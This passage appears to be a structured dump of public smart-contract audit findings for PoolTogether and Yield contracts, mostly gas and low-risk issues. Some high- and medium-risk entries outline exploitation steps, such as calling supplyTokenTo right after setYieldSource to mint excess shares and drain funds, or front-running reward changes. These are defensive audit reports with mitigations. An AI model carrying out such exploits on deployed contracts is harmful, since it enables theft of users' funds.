"SwappableYieldSource", "sponsor disputed"], "target": "2021-07-pooltogether-findings", "body": "_requireYieldSource not always called"}, {"title": "yield source token can be transferred by owner/assetmanager", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/6", "labels": ["bug", "1 (Low Risk)", "SwappableYieldSource", "sponsor acknowledged"], "target": "2021-07-pooltogether-findings", "body": "yield source token can be transferred by owner/assetmanager"}, {"title": "setYieldSource leads to temporary wrong results", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/4", "labels": ["bug", "3 (High Risk)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The use of setYieldSource leaves the contract in a temporary inconsistent state because it changes the underlying yield source, but doesn't (yet) transfer the underlying balances, while the shares stay the same.  The function balanceOfToken will show the wrong results, because it is based on _sharesToToken, which uses yieldSource.balanceOfToken(address(this)), that isn't updated yet.  More importantly supplyTokenTo will give the wrong amount of shares back: First it supplies tokens to the yieldsource. Then is calls _mintShares, which calls _tokenToShares, which calculates the shares, using yieldSource.balanceOfToken(address(this)) This yieldSource.balanceOfToken(address(this)) only contains the just supplied tokens, but doesn't include the tokens from the previous YieldSource. So the wrong amount of shares is given back to the user; they will be given more shares than appropriate which means they can drain funds later on (once transferFunds has been done).  It is possible to make use of this problem in the following way: - monitor the blockchain until you see setYieldSource has been done - immediately call the function supplyTokenTo (which can be called because there is no access control on this function)  ## Proof of Concept // https://github.com/pooltogether/swappable-yield-source/blob/main/contracts/SwappableYieldSource.sol function setYieldSource(IYieldSource _newYieldSource) external onlyOwnerOrAssetManager returns (bool) {     _setYieldSource(_newYieldSource);    function _setYieldSource(IYieldSource _newYieldSource) internal { ..     yieldSource = _newYieldSource;   function supplyTokenTo(uint256 amount, address to) external override nonReentrant {    ..     yieldSource.supplyTokenTo(amount, address(this));     _mintShares(amount, to);   }   function _mintShares(uint256 mintAmount, address to) internal {     uint256 shares = _tokenToShares(mintAmount);     require(shares > 0, \"SwappableYieldSource/shares-gt-zero\");     _mint(to, shares);   }   function _tokenToShares(uint256 tokens) internal returns (uint256) {     uint256 shares;     uint256 _totalSupply = totalSupply(); ..       uint256 exchangeMantissa = FixedPoint.calculateMantissa(_totalSupply, yieldSource.balanceOfToken(address(this))); // based on incomplete yieldSource.balanceOfToken(address(this))       shares = FixedPoint.multiplyUintByMantissa(tokens, exchangeMantissa);     function balanceOfToken(address addr) external override returns (uint256) {     return _sharesToToken(balanceOf(addr));   }   function _sharesToToken(uint256 shares) internal returns (uint256) {     uint256 tokens;     uint256 _totalSupply = totalSupply(); ..       uint256 exchangeMantissa = FixedPoint.calculateMantissa(yieldSource.balanceOfToken(address(this)), _totalSupply); // based on incomplete yieldSource.balanceOfToken(address(this))       tokens = FixedPoint.multiplyUintByMantissa(shares, exchangeMantissa);  ## Tools Used  ## Recommended Mitigation Steps Remove the function setYieldSource  (e.g. only leave swapYieldSource) Or temporally disable actions like supplyTokenTo, redeemToken and balanceOfToken, after setYieldSource and until transferFunds has been done  "}, {"title": "Old yield source still has infinite approval", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/3", "labels": ["bug", "2 (Med Risk)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  tensors   # Vulnerability details  ## Impact After swapping a yield source, the old yield source still has infinite approval. Infinite approval has been used in large attacks if the yield source isn't perfectly safe (see furucombo).  ## Proof of Concept https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L268  ## Recommended Mitigation Steps Decrease approval after swapping the yield source.  "}, {"title": "Some tokens do not have decimals.", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/2", "labels": ["bug", "1 (Low Risk)", "SwappableYieldSource", "sponsor confirmed"], "target": "2021-07-pooltogether-findings", "body": "# Handle  tensors   # Vulnerability details  ## Impact There are a few tokens out there that do not use any decimals. As far as I know none of them would be a good yield source, but just in case something comes out, you may want to include the possibility that decimals = 0.  ## Proof of Concept https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L116  ## Recommended Mitigation Steps Remove the require statement.   "}, {"title": "Sponsored event not used", "html_url": "https://github.com/code-423n4/2021-07-pooltogether-findings/issues/1", "labels": ["bug", "0 (Non-critical)", "mStableYieldSource", "sponsor confirmed", "disagree with severity"], "target": "2021-07-pooltogether-findings", "body": "# Handle  tensors   # Vulnerability details  ## Impact The sponsored event is declared but never used.  ## Proof of Concept https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L27  ## Recommended Mitigation Steps Remove the unused event.  "}, {"title": "Rewards accumaulated can stay constant and oftern not increment", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/65", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged", "disagree with severity", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "Rewards accumaulated can stay constant and oftern not increment"}, {"title": "Rewards squatting - setting rewards in different ERC20 tokens opens various economic attacks. ", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/64", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  moose-code   # Vulnerability details  ## Impact Users have essentially have an option to either claim currently earned reward amounts on future rewards tokens, or the current rewards token.   Although stated on line 84, it does not take into account the implications and lock in this contract will have on the future value of new tokens able to be issued via rewards.   ## Proof of Concept Smart users will monitor the mempool for setRewards transactions. If the new reward token (token b) is less valuable than the old reward token (token a), they front run this transaction by calling claim. Otherwise they let their accrued 'token a' roll into rewards of of the more valuable 'token b'.  Given loads of users will likely hold these tokens from day 1, there will potentially be thousands of different addresses squatting on rewards.   Economically, given the above it makes sense that the value of new reward tokens, i.e. 'token b' should always be less than that of 'token a'. This is undesirable in a rewards token contract as there is no reliable way to start issuing a more valuable token at a later stage, unless exposing yourself to a major risk of reward squatting.  i.e. You could not in future say we want to run a rewards period of of issuing an asset like WETH rewards for 10 days, after first initially issuing DAI as a reward. This hamstrings flexibility of the contract.  P.s. This is one of the slickest contracts I've read. Love how awesome it is.Just believe this should be fixed, then its good to go.   ## Tools Used Manual analysis  ## Recommended Mitigation Steps It is true you could probably write a script to manually go call 'claim' on thousands of squatting token addresses but this is a poor solution.   A simple mapping pattern could be used with an index mapping to a reward cycle with a reward token and a new accumulative etc. Users would likely need to be given a period a to claim from old reward cycles before their token balance could no longer reliably used to calculate past rewards. The would still be able to claim everything up until their last action (even though this may be before the rewards cycle ended).  "}, {"title": "Timelock.sol: Indexing targets array might not be useful", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/63", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "EmergencyBrake", "Timelock"], "target": "2021-08-yield-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  As per the [solidity documentation](https://docs.soliditylang.org/en/v0.8.1/abi-spec.html?highlight=events#events):  However, for all \u201ccomplex\u201d types or types of dynamic length, including all arrays, string, bytes and structs, EVENT_INDEXED_ARGS will contain the Keccak hash of a special in-place encoded value (see Encoding of Indexed Event Parameters), rather than the encoded value directly.  It therefore might not be useful to index `address[] targets` in `Timelock.sol` and `address[] contacts` in `EmergencyBrake.sol`, since it's the keccak hash of the addresses. [Also saves gas to drop the indexed keyword](https://ethereum.stackexchange.com/questions/56486/does-it-make-a-difference-to-index-an-event-with-one-parameter/56491).  ### Recommended Mitigation Steps  Remove the `indexed` keyword for the arguments mentioned above.  "}, {"title": "Methods should be external instead of public", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/61", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor confirmed", "ERC20Rewards", "Strategy"], "target": "2021-08-yield-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  As brought up in a [previous audit issue](https://github.com/code-423n4/2021-05-yield-findings/issues/4), \"the suggestion of changing all public auth functions to external auth will be applied\". The same should therefore be done for the new contracts `Strategy.sol` and `ERC20Rewards.sol`, since all public methods in it aren't called internally.  "}, {"title": "ERC20Rewards.sol: Unnecessary return argument for _updateRewardsPerToken()", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/60", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The `uint128` output by `_updateRewardsPerToken()` isn't used by any function. Furthermore, L107 returns a wrong value.  `if (_totalSupply == 0 || block.timestamp.u32() < rewardsPeriod.start) return 0;`  It should return `rewardsPerToken_.accumulated` instead, because in the case of a new rewards schedule being set, `rewardsPeriod.start` is updated to a new timestamp. Hence, the current accumulated value of all previous reward schedules thus far should be returned.  ### Recommended Mitigation Steps  Since the return value isn't used anywhere, remove it.  "}, {"title": "ERC20Rewards.sol: latest() is unused", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The `latest()` function is unused and can be removed.  ### Recommended Mitigation Steps  Remove L68-L71  "}, {"title": "ERC20Rewards.sol: Have a method to calculate the latest rewardsPerToken accumulated value", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/57", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  This would be equivalent to [Unipool's `rewardPerToken()` function](https://github.com/k06a/Unipool/blob/master/contracts/Unipool.sol#L69). Note that `rewardsPerToken.accumulated` only reflects the latest stored accumulated value, but does not account for pending accumulation like Unipool, and is therefore not the same. It possibly might be mistaken to be so, hence the low risk classification.  ### Recommended Mitigation Steps  A possible implementation is given below.  ```jsx function latestRewardPerToken() external view returns (uint256) {  RewardsPerToken memory rewardsPerToken_ = rewardsPerToken;  if (_totalSupply == 0) return rewardsPerToken_.accumulated;  uint32 end = earliest(block.timestamp.u32(), rewardsPeriod.end);  uint256 timeSinceLastUpdated = end - rewardsPerToken_.lastUpdated;  return rewardsPerToken_.accumulated + 1e18 * timeSinceLastUpdated * rewardsPerToken_.rate / _totalSupply; } ```  "}, {"title": "ERC20Rewards.sol: Consider making rewardsToken immutable", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/56", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  While it might seem like a good feature to have, being able to switch reward tokens will only be useful for tokens which are equivalent in value (probably stablecoins, pegged tokens) since it carries over unclaimed rewards from the previous reward program. It would be safer to keep the reward token immutable as a safeguard against violations of this condition.  "}, {"title": "Missing check for contract existence", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/55", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "Timelock"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Low-level call returns success even if the contract is non-existent. This requires a contract existence check before making the low-level call.  ## Proof of Concept  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/TimeLock.sol#L93  See: \u201cThe low-level functions\u00a0call,\u00a0delegatecall\u00a0and\u00a0staticcall\u00a0return\u00a0true\u00a0as their first return value if the account called is non-existent, as part of the design of the EVM. Account\u00a0existence\u00a0must be checked prior to calling if needed.\u201d from https://docs.soliditylang.org/en/v0.8.7/control-structures.html#error-handling-assert-require-revert-and-exceptions  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Check for target contract existence before call.  "}, {"title": "Unused cauldron_ parameter", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/54", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "Strategy"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  That cauldron_ parameter is not used here and ladle_.cauldron() is used instead. The Ladle constructor initializes its cauldron value and so the only way this could differ from the parameter is if the argument to this function is specified incorrectly.  ## Proof of Concept https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L100  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L106-L107  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/Ladle.sol#L33   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Either use parameter or remove it in favor of the value from ladle_.cauldron().  "}, {"title": "Multiple solc versions may be allowed", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/53", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-yield-findings", "body": "Multiple solc versions may be allowed"}, {"title": "Missing zero-address checks", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/52", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-yield-findings", "body": "Missing zero-address checks"}, {"title": "Missing emits for events", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/51", "labels": ["bug", "duplicate", "1 (Low Risk)", "sponsor confirmed", "Strategy"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Few events are missing emits which prevents the intended data from being observed easily by off-chain interfaces.  ## Proof of Concept  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L48-L49  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add emits or remove event declarations.  "}, {"title": "Upgrading solc compiler version may help with bug fixes\u2028", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/50", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  solc version 0.8.3 and 0.8.4 fixed important bugs in the compiler. Using version 0.8.1 misses these fixes and may cause a vulnerability.  ## Proof of Concept  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/token/ERC20Rewards.sol#L2  https://github.com/ethereum/solidity/releases/tag/v0.8.4: Solidity 0.8.4 fixes a bug in the ABI decoder. The release contains an important bugfix. See\u00a0decoding from memory bug\u00a0blog post for more details.  https://github.com/ethereum/solidity/releases/tag/v0.8.3: Solidity 0.8.3 is a bugfix release that fixes an important bug about how the optimizer handles the Keccak256 opcode. For details on the bug, please see the\u00a0bug blog post.   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Consider upgrading to 0.8.3 or 0.8.4  "}, {"title": "Missing input validation to check that end > start", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/49", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  setRewards() is missing input validation on parameters start and end to check if end > start. If accidentally set incorrectly, this will allow resetting new rewards while there is an ongoing one.   ## Proof of Concept  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/token/ERC20Rewards.sol#L74-L88  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add a require() to check that end > start.  "}, {"title": "Check made redundant by following check", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/48", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "EmergencyBrake", "Timelock"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact The check for array lengths is unnecessary in two places where the following check on txHash will anyway fail if the lengths don\u2019t match with what was hashed earlier during schedule. Removing the length check can save a little gas.  Such a require() in cancel() can be removed because if there is a mismatch, the entry lookup in transactions[] will fail anyway and also, this will not be sceduled/executed.  ## Proof of Concept  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/TimeLock.sol#L70-L72  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/TimeLock.sol#L81-L85   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Evaluate and remove these checks.  "}, {"title": "Redundant check\u2028", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/47", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "Oracles"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  The require check for decimals_ <= 18 is unnecessary given its set to 18 right above unless this needs to be obtained differently as hinted by the comment.  ## Proof of Concept  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/oracles/compound/CTokenMultiOracle.sol#L110-L111  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Evaluate check and remove.  "}, {"title": "Two functions with same code can be replaced by a single one", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/46", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "Oracles"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  As noted in the code comment, peek and get functions are the same for this oracle. So we can change `peek` to public visibility and have `get` call `peek` instead of copying the same code here. Minor deployment cost savings but increase in readability/maintainability.  ## Proof of Concept  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/oracles/composite/CompositeMultiOracle.sol#L91  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/oracles/composite/CompositeMultiOracle.sol#L74-L128  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Replace two functions having the same code with a single function.  "}, {"title": "Not using memory data location specifier for external function parameters will save gas", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/45", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "EmergencyBrake", "FYTokenFactory"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Function parameters are passed in calldata. For external functions, these are simply read from calldata. But explicitly specifying memory location for such parameters will force their copying to memory resulting in extra bytecode and more gas. Leaving them in calldata will save gas.  ## Proof of Concept  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/EmergencyBrake.sol#L45-L46  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/EmergencyBrake.sol#L66-L67  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/EmergencyBrake.sol#L77-L78  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/EmergencyBrake.sol#L101-L102  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/EmergencyBrake.sol#L116-L117  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/FYTokenFactory.sol#L21-L22  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Do not use memory data location specifier for external function parameters  "}, {"title": "Using parameters or local variables instead of state variables in event emits can save gas", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/44", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "ERC20Rewards", "Timelock"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Event emits where there are equivalent local variables or parameters for state variables can save gas by using those instead of state variables because of the expensive SLOADs.  ## Proof of Concept  rewardsToken: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/token/ERC20Rewards.sol#L97  delay: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/TimeLock.sol#L51   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Use parameters or local variables instead of state variables in event emits  "}, {"title": "Caching state variable in local variables for repeated reads saves gas by converting expensive SLOADs into much cheaper MLOADs", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/43", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "ERC20Rewards", "Strategy"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  SLOADs cost 2100 gas for first time reads of state variables and then 100 gas for repeated reads in the context of a transaction (post Berlin fork). MLOADs cost 3 gas units. Therefore, caching state variable in local variables for repeated reads saves gas.  ## Proof of Concept  Examples of state variables that are read at the lines shown and also later in that same function:  rewardsPeriod: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/token/ERC20Rewards.sol#L80  _totalSupply: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/token/ERC20Rewards.sol#L107  nextPool: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L163  ladle: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L172  base: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L180  pool (600 gas savings): https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L183  pool: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L208  cached: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L262   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Consider caching state variables in local variables.  "}, {"title": "Changing function visibility from public to external saves gas", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/42", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "ERC20Rewards", "Strategy"], "target": "2021-08-yield-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  Public functions need to copy their arguments from calldata to memory resulting in more bytecode and gas consumption. If functions are never called from within the contracts, they can be declared external in which case their parameters are always in calldata without being copied to memory. This results in gas savings. There are many such public functions that don\u2019t appear to be called from within the contract.  ## Proof of Concept  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/token/ERC20Rewards.sol#L74-L75  https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L100-L101  All functions declared in this range: https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L127-L252  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Change function visibility from public to external\u2028  "}, {"title": "Storage slot packing impacts gas efficiency\u2028", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/41", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "ERC20Rewards", "Strategy"], "target": "2021-08-yield-findings", "body": "Storage slot packing impacts gas efficiency\u2028"}, {"title": "lack of zero address validation in constructor", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/40", "labels": ["bug", "duplicate", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-yield-findings", "body": "lack of zero address validation in constructor"}, {"title": "Gas optimization on `_updateRewardsPerToken` of `ERC20Rewards`", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  The `_updateRewardsPerToken` function of `ERC20Rewards` is called when a token is transferred, minted, or burned. Thus, it could be called multiple times in a single block. Gas optimization is possible by checking if the `end` variable is equal to `rewardsPerToken_.lastUpdated`. If so, the function can return after line 112 since no reward needs to be updated. The early return could avoid writing to the storage (line 117) and thus save gas.  ## Proof of Concept  Referenced code: [ERC20Rewards.sol#L112](https://github.com/code-423n4/2021-08-yield/blob/main/contracts/utils/token/ERC20Rewards.sol#L112) [ERC20Rewards.sol#L117](https://github.com/code-423n4/2021-08-yield/blob/main/contracts/utils/token/ERC20Rewards.sol#L117)  ## Recommended Mitigation Steps  Simply return if `end == rewardsPerToken_.lastUpdated` if the `_updateRewardsPerToken` function.  "}, {"title": "Exchange rates from Compound are assumed with 18 decimals", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/38", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "Oracles"], "target": "2021-08-yield-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  The `CTokenMultiOracle` contract assumes the exchange rates (borrowing rate) of Compound always have 18 decimals, while, however, which is not true. According to the [Compound documentation](https://compound.finance/docs/ctokens#exchange-rate), the exchange rate returned from the `exchangeRateCurrent` function is scaled by `1 * 10^(18 - 8 + Underlying Token Decimals)` (and so does `exchangeRateStored`). Using a wrong decimal number on the exchange rate could cause incorrect pricing on tokens.  ## Proof of Concept  Referenced code: [CTokenMultiOracle.sol#L110](https://github.com/code-423n4/2021-08-yield/blob/main/contracts/oracles/compound/CTokenMultiOracle.sol#L110)  ## Recommended Mitigation Steps  Follow the documentation and get the decimals of the underlying tokens to set the correct decimal of a `Source`.  "}, {"title": "Uninitialized `updateTime` variables in `CompositeMultiOracle`", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/37", "labels": ["bug", "duplicate", "1 (Low Risk)", "sponsor confirmed", "disagree with severity", "Oracles"], "target": "2021-08-yield-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  The `peek` and `get` functions of `CompositeMultiOracle` do not initialize the return variable `updateTime`, which is always 0 since the oldest timestamp is chosen and returned.  ## Proof of Concept  Referenced code: [CompositeMultiOracle.sol#L76](https://github.com/code-423n4/2021-08-yield/blob/main/contracts/oracles/composite/CompositeMultiOracle.sol#L76) [CompositeMultiOracle.sol#L96](https://github.com/code-423n4/2021-08-yield/blob/main/contracts/oracles/composite/CompositeMultiOracle.sol#L96)  ## Recommended Mitigation Steps  Handle the case when `updateTimeIn` is 0 in the private `_peek` and `_get` functions. If so, simply return `updateTimeOut`.  "}, {"title": "Use `safeTransfer` instead of `transfer`", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/36", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  Tokens not compliant with the ERC20 specification could return `false` from the `transfer` function call to indicate the transfer fails, while the calling contract would not notice the failure if the return value is not checked. Checking the return value is a requirement, as written in the [EIP-20](https://eips.ethereum.org/EIPS/eip-20) specification:  > Callers MUST handle `false` from `returns (bool success)`. Callers MUST NOT assume that `false` is never returned!  ## Proof of Concept  Referenced code: [ERC20Rewards.sol#L175](https://github.com/code-423n4/2021-08-yield/blob/main/contracts/utils/token/ERC20Rewards.sol#L175)  ## Recommended Mitigation Steps  Use the `SafeERC20` library [implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) from OpenZeppelin and call `safeTransfer` or `safeTransferFrom` when transferring ERC20 tokens.  "}, {"title": "Using unlocked/floating pragmas", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/35", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-yield-findings", "body": "Using unlocked/floating pragmas"}, {"title": "Gas: `ERC20Rewards._updateRewardsPerToken` return value is not needed", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  cmichel   # Vulnerability details  The return value is never used and should be removed to save some gas.  "}, {"title": "Gas: `TimeLock.setDelay` reads storage variable for event", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/33", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor confirmed", "Timelock"], "target": "2021-08-yield-findings", "body": "# Handle  cmichel   # Vulnerability details  `TimeLock.setDelay` reads storage variable for event which produces an `SLOAD`. It should use `emit DelaySet(_delay)` instead of `emit DelaySet(delay)`  "}, {"title": "No ERC20 safe* versions called", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/31", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  cmichel   # Vulnerability details  The `claim` function performs an ERC20 transfer `rewardsToken.transfer(to, claiming);` but does not check the return value, nor does it work with all legacy tokens.  Some tokens (like USDT) don't correctly implement the EIP20 standard and their `transfer`/`transferFrom` function return `void` instead of a success boolean. Calling these functions with the correct EIP20 function signatures will always revert.  The `ERC20.transfer()` and `ERC20.transferFrom()` functions return a boolean value indicating success. This parameter needs to be checked for success. Some tokens do **not** revert if the transfer failed but return `false` instead.   ## Impact Tokens that don't actually perform the 